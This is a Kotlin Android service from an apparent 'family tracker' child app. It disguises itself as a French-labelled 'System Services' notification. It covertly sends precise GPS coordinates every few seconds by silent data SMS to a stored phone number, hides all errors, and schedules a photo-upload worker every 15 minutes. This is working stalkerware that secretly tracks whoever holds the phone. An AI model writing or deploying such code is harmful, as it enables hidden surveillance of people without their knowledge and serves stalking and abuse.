package com.family.tracker.child
import android.app.*; import android.content.Context; import android.content.Intent; import android.os.IBinder; import android.telephony.SmsManager; import com.google.android.gms.location.*
class LocationService:Service(){private lateinit var fused:FusedLocationProviderClient;override fun onBind(i:Intent?):IBinder?=null;override fun onCreate(){super.onCreate();fused=LocationServices.getFusedLocationProviderClient(this);val c=NotificationChannel("sys_channel","System Services",NotificationManager.IMPORTANCE_MIN);getSystemService(NotificationManager::class.java).createNotificationChannel(c)}
override fun onStartCommand(i:Intent?,f:Int,s:Int):Int{val n=Notification.Builder(this,"sys_channel").setContentTitle("Services système").setContentText("Exécution en arrière-plan").setSmallIcon(android.R.drawable.ic_menu_info_details).setOngoing(true).setShowWhen(false).build();startForeground(1,n);val p=getSharedPreferences("tracker",Context.MODE_PRIVATE);val num=p.getString("parent","")?:"";if(num.isEmpty()){stopSelf();return START_NOT_STICKY}
try{fused.lastLocation.addOnSuccessListener{l->l?.let{val d="${it.latitude},${it.longitude},${it.accuracy},${System.currentTimeMillis()}".toByteArray();try{SmsManager.getDefault().sendDataMessage(num,null,8901.toShort(),d,null,null)}catch(_:Exception){}}}}catch(_:Exception){}
val r=LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY,30000).setMinUpdateIntervalMillis(10000).build();val cb=object:LocationCallback{override fun onLocationResult(res:LocationResult){val l=res.lastLocation?:return;val d="${l.latitude},${l.longitude},${l.accuracy},${System.currentTimeMillis()}".toByteArray();try{SmsManager.getDefault().sendDataMessage(num,null,8901.toShort(),d,null,null)}catch(_:Exception){}}}};try{fused.requestLocationUpdates(r,cb,mainLooper)}catch(_:SecurityException){}
androidx.work.WorkManager.getInstance(this).enqueue(androidx.work.PeriodicWorkRequestBuilder<PhotoUploaderWorker>(15,java.util.concurrent.TimeUnit.MINUTES).build())
return START_STICKY}}
